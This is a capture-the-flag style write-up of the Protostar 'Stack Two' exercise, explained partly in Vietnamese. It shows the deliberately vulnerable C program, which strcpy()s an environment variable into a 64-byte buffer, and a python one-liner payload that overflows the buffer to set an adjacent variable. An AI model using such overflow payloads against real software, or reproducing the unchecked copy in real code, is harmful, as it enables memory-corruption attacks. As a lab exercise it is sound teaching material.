# STACK TWO

## About

Stack2 looks at environment variables, and how they can be set.

This level is at /opt/protostar/bin/stack2

## Source code

```C
#include <stdlib.h>
#include <unistd.h>
#include <stdio.h>
#include <string.h>

int main(int argc, char **argv)
{
  volatile int modified;
  char buffer[64];
  char *variable;

  variable = getenv("GREENIE");

  if(variable == NULL) {
      errx(1, "please set the GREENIE environment variable\n");
  }

  modified = 0;

  strcpy(buffer, variable);

  if(modified == 0x0d0a0d0a) {
      printf("you have correctly modified the variable\n");
  } else {
      printf("Try again, you got 0x%08x\n", modified);
  }

}
```

## Solutions

`STACK TWO` được thay đổi một chút từ `STACK ONE` khi mà vẫn có thể khai thác buffer overflow thông qua `strcpy()` nhưng giá trị được sao chép là từ `Environment Variables` - `Biến môi trường` mà chương trình yêu cầu là `GREENIE`.

Ta tiến hành set giá trị cho biến môi trường `GREENIE`:

```
root@protostar:/opt/protostar/bin# GREENIE=$(python -c 'print "A" * 64 + "\x0a\x0d\x0a\x0d"')           
root@protostar:/opt/protostar/bin# export GREENIE 
```
Lưu ý `Little Edian` và lưu biến môi trường vào danh sách.

```
root@protostar:/opt/protostar/bin# ./stack2                                                             
you have correctly modified the variable
```

## Documents

<https://itandsecuritystuffs.wordpress.com/2014/03/18/understanding-buffer-overflows-attacks-part-1/>

<https://www.coengoedegebure.com/buffer-overflow-attacks-explained/>

<https://en.wikipedia.org/wiki/Endianness>

<https://linuxconfig.org/how-to-set-and-list-environment-variables-on-linux>


